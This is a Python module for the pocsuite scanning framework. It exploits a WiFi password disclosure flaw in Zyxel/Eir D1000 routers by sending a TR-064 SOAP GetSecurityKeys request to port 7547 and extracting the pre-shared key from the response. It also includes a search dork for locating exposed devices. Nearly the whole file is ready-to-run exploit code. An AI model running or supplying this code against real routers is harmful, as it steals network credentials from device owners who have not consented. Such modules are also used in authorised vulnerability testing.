#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from pocsuite.lib.utils.funs import url2ip
import re


class TestPOC(POCBase):
    name = "Zyxel Eir D1000 WiFi Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Password Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://github.com/XiphosResearch/exploits/tree/master/tr-06fail'
    desc = 'Module exploits WiFi Password Disclosure vulnerability in Zyxel/Eir D1000 devices.If the target is vulnerable it allows to read WiFi password.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'Zyxel'
    appVersion = 'Eir D1000'
    dork = 'EIR-D1000'
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = url2ip(self.url)
        target_url = 'http://'+ url + ":7547//UD/act?1"
        headers = {"SOAPAction": "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"}
        data = ("<?xml version=\"1.0\"?>"
                "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                " <SOAP-ENV:Body>"
                "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
                "  </u:GetSecurityKeys>"
                " </SOAP-ENV:Body>"
                "</SOAP-ENV:Envelope>")

        resp = req.post(target_url,headers=headers,data=data)
        if resp.content:
            password = re.findall("<NewPreSharedKey>(.*?)</NewPreSharedKey>", resp.content)
            if password:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Password'] = password



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
